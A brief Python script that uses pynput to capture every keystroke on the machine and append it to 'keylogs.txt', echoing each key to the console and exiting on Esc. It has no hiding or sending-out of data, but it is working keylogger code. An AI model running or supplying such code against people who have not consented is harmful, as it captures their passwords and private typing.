import pynput
from pynput import keyboard
def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            if isinstance(key, keyboard.Key):
                if key == keyboard.Key.esc:
                    return False
                elif key == keyboard.Key.enter:
                    f.write('\n')
                    print('[ENTER]')
                elif key == keyboard.Key.space:
                    f.write(' ')
                    print('[SPACE]')
                elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r]:
                    pass
                else:
                    f.write(f'[{key.name.upper()}]')
                    print(f'[{key.name.upper()}]')
            else:
                char = key.char
                if char is not None:
                    f.write(char)
                    print(char)
    except Exception as e:
        print(f'An error occurred: {e}')
def on_release(key):
    if key == keyboard.Key.esc:
        return False
try:
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()
except KeyboardInterrupt:
    pass
finally:
    try:
        if 'listener' in locals() and listener.is_alive():
            listener.stop()
        open('keylogs.txt', 'a').close()
    except Exception as e:
        print(f'An error occurred while stopping the listener: {e}')
